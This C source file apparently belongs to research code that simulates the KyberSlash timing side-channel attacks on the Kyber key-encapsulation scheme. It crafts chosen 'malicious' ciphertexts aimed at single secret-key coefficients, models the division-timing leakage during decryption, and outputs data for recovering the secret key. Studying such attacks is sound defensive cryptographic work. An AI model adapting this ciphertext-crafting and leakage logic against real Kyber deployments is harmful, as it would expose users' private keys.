#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

#include "api.h"
#include "rng.h"
#include "indcpa.h"
#include "poly.h"
#include "polyvec.h"
#include "symmetric.h"

#include "udiv_leakage.h"

// Next we defined attack parameters that depend on the different Kyber security levels
#if (KYBER_K == 2)

    #define N_SECRET_SUPPORT 7 // {-3, -2, -1, 0, 1, 2}
    #define MIN_SECRET_COEFF (-3)
    #define PLAINTEXT_CHECK_N_CONSTANTS 6

    static int16_t PLAINTEXT_CHECK_MALICIOUS_U_CONSTANTS[PLAINTEXT_CHECK_N_CONSTANTS] = {207, 2, 106, 70, 106, 70};
    static int16_t PLAINTEXT_CHECK_MALICIOUS_V_CONSTANTS[PLAINTEXT_CHECK_N_CONSTANTS] = {937, 729, 521, 521, -728, -728};
    int16_t PLAINTEXT_CHECK_ANSWER_TEMPLATE[N_SECRET_SUPPORT][PLAINTEXT_CHECK_N_CONSTANTS] = {
        {1, 1, 1, 1, 0, 0},
        {1, 1, 1, 0, 0, 0},
        {1, 1, 0, 0, 0, 0},
        {1, 0, 0, 0, 0, 0},
        {0, 0, 0, 0, 0, 0},
        {0, 0, 0, 0, 1, 0},
        {0, 0, 0, 0, 1, 1},
    };

#elif (KYBER_K == 3)

    #define N_SECRET_SUPPORT 5 // {-2, -1, 0, 1, 2}
    #define MIN_SECRET_COEFF (-2)

    #define PLAINTEXT_CHECK_N_CONSTANTS 4

    static int16_t PLAINTEXT_CHECK_MALICIOUS_U_CONSTANTS[PLAINTEXT_CHECK_N_CONSTANTS] = {207, 2, 106, 106};
    static int16_t PLAINTEXT_CHECK_MALICIOUS_V_CONSTANTS[PLAINTEXT_CHECK_N_CONSTANTS] = {937, 729, 521, -728};
    int16_t PLAINTEXT_CHECK_ANSWER_TEMPLATE[N_SECRET_SUPPORT][PLAINTEXT_CHECK_N_CONSTANTS] = {
        {1, 1, 1, 0},
        {1, 1, 0, 0},
        {1, 0, 0, 0},
        {0, 0, 0, 0},
        {0, 0, 0, 1},
    };

#elif (KYBER_K == 4)

    #define N_SECRET_SUPPORT 5 // {-2, -1, 0, 1, 2}
    #define MIN_SECRET_COEFF (-2)

    #define PLAINTEXT_CHECK_N_CONSTANTS 4

    static int16_t PLAINTEXT_CHECK_MALICIOUS_U_CONSTANTS[PLAINTEXT_CHECK_N_CONSTANTS] = {104, 1, 53, 53};
    static int16_t PLAINTEXT_CHECK_MALICIOUS_V_CONSTANTS[PLAINTEXT_CHECK_N_CONSTANTS] = {885, 781, 677, -780};
    int16_t PLAINTEXT_CHECK_ANSWER_TEMPLATE[N_SECRET_SUPPORT][PLAINTEXT_CHECK_N_CONSTANTS] = {
        {1, 1, 1, 0},
        {1, 1, 0, 0},
        {1, 0, 0, 0},
        {0, 0, 0, 0},
        {0, 0, 0, 1},
    };

#elif
    #error "Attack not implemented for this parameter set"
#endif


#define NOT_FOUND_TEMPLATE -100
#define MOD(a,b) ((((a)%(b))+(b))%(b))

// Global variables that are used to extract the values known by the attacker
// and the secret information from the Kyber implementation.
polyvec global__u = {0};                              // Attacker knows
poly global__v = {0};                                 // Attacker knows
polyvec global__delta_u = {0};                        // Attacker knows
poly global__delta_v = {0};                           // Attacker knows
polyvec global__r = {0};                              // Attacker knows
polyvec global__e1 = {0};                             // Attacker knows
poly global__e2 = {0};                                // Attacker knows

// BEGIN SECRET VARIABLES =========================================================================
// BE CAREFUL WITH THE SECRET INFORMATION BELOW
// The secret key (global__s, global__e) must only be used to
// analyze the convergence of the solver.
polyvec global__s = {0};                              // SECRET: USE CAREFULLY
polyvec global__e = {0};                              // SECRET: USE CAREFULLY

// Variable global__message is used to store the message computed during decryption.
// While its value is secret, the attacker can use timing attack to distinguish
// between two possible messages, and recover the key.
uint8_t global__message[KYBER_INDCPA_MSGBYTES] = {0}; // SECRET: USE CAREFULLY

// The global__noisy_message contains the noisy coefficients (before decoding the message).
// The values of the coefficients are not known to the attacker!
// The attacker must learn only a `predicted` Hamming Weight of the coefficients in the
// the Side-Channel simulation. The prediction is done using a confusion matrix that
// was generated for a real SCA setup.
poly global__noisy_message = {0};                     // SECRET: USE CAREFULLY
// END SECRET VARIABLES ===========================================================================


typedef struct attack_parameters_s {
    uint8_t message_low_cycles[KYBER_SYMBYTES];
    uint8_t message_high_cycles[KYBER_SYMBYTES];
    int n_low_cycles;
    int n_high_cycles;
} attack_parameters_t;


static void pack_ciphertext(uint8_t r[KYBER_INDCPA_BYTES],
                            polyvec *b,
                            poly *v) {
    polyvec_compress(r, b);
    poly_compress(r+KYBER_POLYVECCOMPRESSEDBYTES, v);
}

void write_solution(polyvec *s) {
    printf("s = [");
    for (int k = 0; k < KYBER_K; k++) {
        for (int i = 0; i < KYBER_N; i++) {
            printf("%d,", s->vec[k].coeffs[i]);
        }
    }
    printf("]\n");
}

void read_pk(uint8_t pk[CRYPTO_PUBLICKEYBYTES], char const filename[]) {
    FILE *pk_file = fopen(filename, "r");
    if (!pk_file) {
        fprintf(stderr, "Could not open %s\n", filename);
        exit(1);
    }

    for (int i = 0; i < CRYPTO_PUBLICKEYBYTES; i++) {
        fscanf(pk_file, "%02hhx", &pk[i]);
    }
    fclose(pk_file);
}

void read_sk(uint8_t sk[CRYPTO_SECRETKEYBYTES], char const filename[]) {
    FILE *sk_file = fopen(filename, "r");
    if (!sk_file) {
        fprintf(stderr, "Could not open %s\n", filename);
        exit(1);
    }

    for (int i = 0; i < CRYPTO_SECRETKEYBYTES; i++) {
        fscanf(sk_file, "%02hhx", &sk[i]);
    }
    fclose(sk_file);
}


void dump_bytes(uint8_t bytes[], int n_bytes) {
    for (int i = 0; i < n_bytes; i++) {
        printf("%02x", bytes[i]);
    }
    printf("\n");
}

void global_s_to_array(int s_array[KYBER_K * KYBER_N]) {
    int j = 0;
    for (int k = 0; k < KYBER_K; k++) {
        for (int i = 0; i < KYBER_N; i++) {
            s_array[j++] = global__s.vec[k].coeffs[i];
        }
    }
}

int get_poly_compression_leakage_kyberslash2(poly *a) {
    unsigned int i,j;

    poly_csubq(a);

    int leakage = 0;

#if (KYBER_POLYCOMPRESSEDBYTES == 128)
    for (i = 0; i < KYBER_N/8; i++) {
        for (j = 0; j < 8; j++) {
            // t[j] = ((((uint16_t)a->coeffs[8*i+j] << 4) + KYBER_Q/2)/KYBER_Q) & 15;
            uint32_t numerator = ((uint16_t)a->coeffs[8*i+j] << 4) + KYBER_Q/2;
            leakage += get_udiv_leakage(numerator);
        }

    }
#elif (KYBER_POLYCOMPRESSEDBYTES == 160)
    for (i = 0; i < KYBER_N/8; i++) {
        for (j = 0; j < 8; j++) {
            // t[j] = ((((uint32_t)a->coeffs[8*i+j] << 5) + KYBER_Q/2)/KYBER_Q) & 31;
            uint32_t numerator = ((uint32_t)a->coeffs[8*i+j] << 5) + KYBER_Q/2;
            leakage += get_udiv_leakage(numerator);
        }
    }
#else
    #error "KYBER_POLYCOMPRESSEDBYTES needs to be in {128, 160}"
#endif

    return leakage;
}

int get_polyvec_compression_leakage_kyberslash2(polyvec *a) {
    unsigned int i,j,k;
    polyvec_csubq(a);

    int leakage = 0;

#if (KYBER_POLYVECCOMPRESSEDBYTES == (KYBER_K * 352))
    for (i = 0; i < KYBER_K; i++) {
        for (j = 0; j < KYBER_N/8; j++) {
            for (k = 0; k < 8; k++) {
                // t[k] = ((((uint32_t)a->vec[i].coeffs[8*j+k] << 11) + KYBER_Q/2) /KYBER_Q) & 0x7ff;
                uint32_t numerator = ((uint32_t)a->vec[i].coeffs[8*j+k] << 11) + KYBER_Q/2;
                leakage += get_udiv_leakage(numerator);
            }
        }
    }
#elif (KYBER_POLYVECCOMPRESSEDBYTES == (KYBER_K * 320))
    for (i = 0; i < KYBER_K; i++) {
        for (j = 0; j < KYBER_N/4; j++) {
            for (k = 0; k < 4; k++) {
                uint32_t numerator = ((uint32_t)a->vec[i].coeffs[4*j+k] << 10) + KYBER_Q/2;
                leakage += get_udiv_leakage(numerator);
            }
        }
    }
#else
    #error "KYBER_POLYVECCOMPRESSEDBYTES needs to be in {320*KYBER_K, 352*KYBER_K}"
#endif

    return leakage;
}


int simulate_timing_leakage_poly_to_msg_kyberslash1(poly *noisy_message) {
    poly mp;

    // Get input to poly_tomsg
    memcpy(&mp, noisy_message, sizeof(mp));
    poly_reduce(&mp);

    // Set poly_tomsg input
    poly *a = &mp;
    uint8_t msg[KYBER_INDCPA_MSGBYTES] = {0};

    // Apply poly_tomsg(uint8_t msg[KYBER_INDCPA_MSGBYTES], poly *a)
    unsigned int i, j;
    uint16_t t;

    poly_csubq(a);

    uint16_t numerators[KYBER_N] = {0};
    int n_idx = 0;

    for(i=0; i < KYBER_N / 8; i++) {
        msg[i] = 0;
        for(j = 0; j < 8; j++) {
            uint16_t numerator = (((uint16_t)a->coeffs[8*i+j] << 1) + KYBER_Q/2);
            t = (numerator / KYBER_Q) & 1;
            msg[i] |= t << j;

            numerators[n_idx++] = numerator;
        }
    }
    // Verify decoded message is the same
    for(i=0; i < KYBER_N / 8; i++) {
        assert(msg[i] == global__message[i]);
    }

    int timing_leakage = 0;
    for (i = 0; i < KYBER_N; i++) {
        timing_leakage += get_udiv_leakage(numerators[i]);
    }
    return timing_leakage;
}


int get_compression_leakage_kyberslash2(polyvec *u, poly *v) {
    int leakage = 0;

    leakage += get_polyvec_compression_leakage_kyberslash2(u);
    leakage += get_poly_compression_leakage_kyberslash2(v);

    return leakage;
}


void get_polyvec_compression_leakages_kyberslash2(int leakages[KYBER_K], polyvec *a) {
    unsigned int i,j,k;
    polyvec_csubq(a);


#if (KYBER_POLYVECCOMPRESSEDBYTES == (KYBER_K * 352))
    for (i = 0; i < KYBER_K; i++) {
        int leakage = 0;
        for (j = 0; j < KYBER_N/8; j++) {
            for (k = 0; k < 8; k++) {
                // t[k] = ((((uint32_t)a->vec[i].coeffs[8*j+k] << 11) + KYBER_Q/2) /KYBER_Q) & 0x7ff;
                uint32_t numerator = ((uint32_t)a->vec[i].coeffs[8*j+k] << 11) + KYBER_Q/2;
                leakage += get_udiv_leakage(numerator);
            }
        }
        leakages[i] = leakage;
    }
#elif (KYBER_POLYVECCOMPRESSEDBYTES == (KYBER_K * 320))
    for (i = 0; i < KYBER_K; i++) {
        int leakage = 0;
        for (j = 0; j < KYBER_N/4; j++) {
            for (k = 0; k < 4; k++) {
                uint32_t numerator = ((uint32_t)a->vec[i].coeffs[4*j+k] << 10) + KYBER_Q/2;
                leakage += get_udiv_leakage(numerator);
            }
        }
        leakages[i] = leakage;
    }
#else
    #error "KYBER_POLYVECCOMPRESSEDBYTES needs to be in {320*KYBER_K, 352*KYBER_K}"
#endif
}

int get_leakage_for_message(uint8_t pk[CRYPTO_PUBLICKEYBYTES], uint8_t message[KYBER_SYMBYTES]) {
    uint8_t ct[CRYPTO_CIPHERTEXTBYTES] = {0};

    uint8_t message_and_coins[2*KYBER_SYMBYTES] = {0};
    memcpy(message_and_coins, message, KYBER_SYMBYTES);
    /* Will contain key, coins */
    uint8_t kr[2*KYBER_SYMBYTES];

    /* Multitarget countermeasure for coins + contributory KEM */
    hash_h(message_and_coins+KYBER_SYMBYTES, pk, KYBER_PUBLICKEYBYTES);
    hash_g(kr, message_and_coins, 2*KYBER_SYMBYTES);

    /* coins are in kr+KYBER_SYMBYTES */
    indcpa_enc(ct, message_and_coins, pk, kr+KYBER_SYMBYTES);

    int leakage = get_compression_leakage_kyberslash2(&global__u, &global__v);

    return leakage;
}

void get_ct_for_message(uint8_t ct[CRYPTO_CIPHERTEXTBYTES], uint8_t pk[CRYPTO_PUBLICKEYBYTES], uint8_t message[KYBER_SYMBYTES]) {
    uint8_t message_and_coins[2*KYBER_SYMBYTES] = {0};
    memcpy(message_and_coins, message, KYBER_SYMBYTES);
    /* Will contain key, coins */
    uint8_t kr[2*KYBER_SYMBYTES];

    /* Multitarget countermeasure for coins + contributory KEM */
    hash_h(message_and_coins+KYBER_SYMBYTES, pk, KYBER_PUBLICKEYBYTES);
    hash_g(kr, message_and_coins, 2*KYBER_SYMBYTES);

    /* coins are in kr+KYBER_SYMBYTES */
    indcpa_enc(ct, message_and_coins, pk, kr+KYBER_SYMBYTES);
}

int find_most_distinguishable_message_pair_with_1_bit_difference(attack_parameters_t *attack_parameters,
                                                                 uint8_t pk[CRYPTO_PUBLICKEYBYTES],
                                                                 int n_samples) {

    int max_diff = -1;
    // printf("[*] Finding good message pair using %d samples...\n", n_samples);
    fflush(stdout);
    for (int s = 0; s < n_samples; s++) {
        // if (s % 100 == 0) printf("%d / %d\r", s, n_samples);
        uint8_t message0[KYBER_SYMBYTES] = {0};
        uint8_t message1[KYBER_SYMBYTES] = {0};

        message0[0] = 0;
        randombytes(message0 + 1, KYBER_SYMBYTES - 1);
        memcpy(message1, message0, KYBER_SYMBYTES);
        message1[0] ^= 1;

        int leakage0 = get_leakage_for_message(pk, message0);
        int leakage1 = get_leakage_for_message(pk, message1);
        int diff = abs(leakage0 - leakage1);

        if (leakage1 < leakage0) {
            continue;
        }
        if (diff > max_diff) {
            max_diff = diff;
            if (leakage0 <= leakage1) {
                memcpy(attack_parameters->message_low_cycles, message0, KYBER_SYMBYTES);
                memcpy(attack_parameters->message_high_cycles, message1, KYBER_SYMBYTES);
                attack_parameters->n_low_cycles = leakage0;
                attack_parameters->n_high_cycles = leakage1;
            }
            else {
                memcpy(attack_parameters->message_low_cycles, message1, KYBER_SYMBYTES);
                memcpy(attack_parameters->message_high_cycles, message0, KYBER_SYMBYTES);
                attack_parameters->n_low_cycles = leakage1;
                attack_parameters->n_high_cycles = leakage0;
            }
            // printf("[*] Current max_diff = %d\n", max_diff);
        }
        // printf("%d, %d, %d | max = %d\n", leakage0, leakage1, diff, max_diff);
    }
    // printf("Done\n");
    // printf("[.] Found max_diff = %d\n", max_diff);

    return 0;
}

void craft_malicious_ciphertext_for_message(uint8_t ct[KYBER_INDCPA_BYTES],
                                            uint8_t message[KYBER_SYMBYTES],
                                            int32_t target_secret_block,
                                            int32_t target_secret_index,
                                            int32_t u_value,
                                            int32_t v_value) {
    polyvec u = {0};
    poly v = {0};

    int sign = target_secret_index == 0 ? 1 : -1;
    int u_index = MOD((KYBER_N - target_secret_index), KYBER_N);

    u.vec[target_secret_block].coeffs[u_index] = MOD(sign*u_value, KYBER_Q);

    for (int i = 0; i < KYBER_N; i++) {
        int i_block = i / 8;
        int i_off = i % 8;
        int bit = (message[i_block] >> i_off) & 1;
        v.coeffs[i] = bit * (KYBER_Q/2 + 1);
    }
    v.coeffs[0] = MOD(v.coeffs[0] + v_value, KYBER_Q);

    pack_ciphertext(ct, &u, &v);
}


void attack_parameters_print(attack_parameters_t *attack_parameters) {
    printf("[.] message_low_cycles:  ");
    for (int i = 0; i < KYBER_SYMBYTES; i++) {
        printf("%02x", attack_parameters->message_low_cycles[i]);
    }
    printf("\n");
    printf("[.] message_high_cycles: ");
    for (int i = 0; i < KYBER_SYMBYTES; i++) {
        printf("%02x", attack_parameters->message_high_cycles[i]);
    }
    printf("\n");

    printf("[.] leakage_low_cycles %d\n", attack_parameters->n_low_cycles);
    printf("[.] leakage_high_cycles %d\n", attack_parameters->n_high_cycles);
}


uint8_t PRNG_RANDOMBYTES_SEED[48] = {
    0x2e,0xca,0x10,0x8f,0x0c,0x8b,0xff,0x77,0x27,0xd8,0x06,0x6d,0x1b,0xa9,0xf1,0x37,
    0xe2,0xfa,0xda,0x9d,0x98,0x29,0x77,0xb9,0xf5,0x9d,0x3a,0x77,0x9f,0xd5,0x7c,0xd1,
    0xae,0x0b,0x34,0xee,0xda,0x41,0x68,0x04,0x04,0xc9,0xa9,0xee,0x55,0xa2,0xc8,0x31,
};

int generate_attack_ciphertexts_with_extra_information(int argc, char const *argv[]) {

    uint8_t pk[CRYPTO_PUBLICKEYBYTES] = {0};
    uint8_t sk[CRYPTO_SECRETKEYBYTES] = {0};
    uint8_t ss[CRYPTO_BYTES] = {0};
    uint8_t ss2[CRYPTO_BYTES] = {0};

    if (argc != 4) {
        fprintf(stderr, "Usage: %s seed n_distinguishing_messages n_tries_to_find_message_pair\n", argv[0]);
        exit(1);
    }
    int seed = atoi(argv[1]);
    int n_distinguishing_messages = atoi(argv[2]);
    int n_tries_to_find_message_pair = atoi(argv[3]);
    assert(n_distinguishing_messages > 0);
    assert(n_tries_to_find_message_pair > 0);

    printf("[*] seed = %d\n", seed);
    printf("[*] n_distinguishing_messages = %d\n", n_distinguishing_messages);
    printf("[*] n_tries_to_find_message_pair = %d\n", n_tries_to_find_message_pair);
    printf("[*] DEVICE: %d\n", DEVICE);

    uint8_t entropy_input[48];
    for (int i = 0; i < 48; i++)
        entropy_input[i] = seed >> 8*(i);
    randombytes_init(entropy_input, NULL, 256);


    assert(crypto_kem_keypair(pk, sk) == 0);

    int s_array[KYBER_K * KYBER_N] = {0};
    global_s_to_array(s_array);

    printf("[*] Target secret key coefficients ");
    write_solution(&global__s);

    uint8_t ct_test[CRYPTO_CIPHERTEXTBYTES] = {0};
    assert(crypto_kem_enc(ct_test, ss, pk) == 0);
    assert(crypto_kem_dec(ss2, ct_test, sk) == 0);
    assert(memcmp(ss, ss2, CRYPTO_BYTES) == 0);

    printf("[*] pk =  ");
    dump_bytes(pk, CRYPTO_PUBLICKEYBYTES);
    printf("[*] sk =  ");
    dump_bytes(sk, CRYPTO_SECRETKEYBYTES);

    printf("message_idx,block,i,t,ku,kv,idx,l1,l2,leakage,distance_kyberslash2,ciphertext\n");
    for (int message_idx = 1; message_idx <= n_distinguishing_messages; message_idx++) {
        attack_parameters_t attack_parameters = {0};
        find_most_distinguishable_message_pair_with_1_bit_difference(&attack_parameters, pk, n_tries_to_find_message_pair);
        // attack_parameters_print(&attack_parameters);

        for (int k = 0; k < KYBER_K; k++) {
            for (int i = 0; i < KYBER_N; i++) {
                for (int t = 0; t < PLAINTEXT_CHECK_N_CONSTANTS; t++) {
                    uint8_t ct[CRYPTO_CIPHERTEXTBYTES] = {0};
                    craft_malicious_ciphertext_for_message(ct, attack_parameters.message_low_cycles, k, i,
                                                           PLAINTEXT_CHECK_MALICIOUS_U_CONSTANTS[t],
                                                           PLAINTEXT_CHECK_MALICIOUS_V_CONSTANTS[t]);
                    assert(crypto_kem_dec(ss, ct, sk) == 0);
                    int l1 = simulate_timing_leakage_poly_to_msg_kyberslash1(&global__noisy_message);
                    int l2 = get_compression_leakage_kyberslash2(&global__u, &global__v);
                    int m_index = memcmp(global__message, attack_parameters.message_high_cycles, KYBER_INDCPA_MSGBYTES) == 0;
                    printf("%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,", message_idx, k, i, t,
                        PLAINTEXT_CHECK_MALICIOUS_U_CONSTANTS[t], PLAINTEXT_CHECK_MALICIOUS_V_CONSTANTS[t],
                        m_index, l1, l2, l1 + l2,
                        attack_parameters.n_high_cycles - attack_parameters.n_low_cycles);
                    dump_bytes(ct, CRYPTO_CIPHERTEXTBYTES);
                }
            }
        }
    }

    return 0;
}

int generate_ku_kv() {
    uint8_t pk[N_SECRET_SUPPORT][2][CRYPTO_PUBLICKEYBYTES] = {0};
    uint8_t sk[N_SECRET_SUPPORT][2][CRYPTO_SECRETKEYBYTES] = {0};
    for (int s_coeff = MIN_SECRET_COEFF; s_coeff <= -MIN_SECRET_COEFF; s_coeff++) {
        for (int b = 0; b < 2; b++) {
            while (1) {
                assert(crypto_kem_keypair(pk[s_coeff - MIN_SECRET_COEFF][b],
                                          sk[s_coeff - MIN_SECRET_COEFF][b]) == 0);

                int s_array[KYBER_K * KYBER_N] = {0};
                global_s_to_array(s_array);
                // printf("[*] Target secret key: ");
                // write_solution(&global__s);
                if (s_array[b] == s_coeff)
                    break;
            }
        }
    }

    printf("s_coeff,ku,kv,positive_ku_result,negative_ku_result\n");
    for (int s_coeff = MIN_SECRET_COEFF; s_coeff <= -MIN_SECRET_COEFF; s_coeff++) {
        uint8_t message[KYBER_INDCPA_MSGBYTES] = {0};
        for (int ku = 0; ku < KYBER_Q; ku += 3) {
            for (int kv = 0; kv < KYBER_Q; kv += 33) {
                uint8_t ct[CRYPTO_CIPHERTEXTBYTES] = {0};
                uint8_t ss[CRYPTO_BYTES] = {0};
                craft_malicious_ciphertext_for_message(ct, message, 0, 0, ku, kv);
                assert(crypto_kem_dec(ss, ct, sk[s_coeff - MIN_SECRET_COEFF][0]) == 0);
                int positive_result = memcmp(message, global__message, KYBER_INDCPA_MSGBYTES) != 0;
                craft_malicious_ciphertext_for_message(ct, message, 0, 1, ku, kv);
                assert(crypto_kem_dec(ss, ct, sk[s_coeff - MIN_SECRET_COEFF][1]) == 0);
                int negative_result = memcmp(message, global__message, KYBER_INDCPA_MSGBYTES) != 0;
                printf("%d,%d,%d,%d,%d\n", s_coeff, ku, kv, positive_result, negative_result);
                // dump_bytes(global__message, KYBER_INDCPA_MSGBYTES);
            }
        }
    }
    return 0;
}


int main(int argc, char const *argv[]) {
    return generate_attack_ciphertexts_with_extra_information(argc, argv);
}
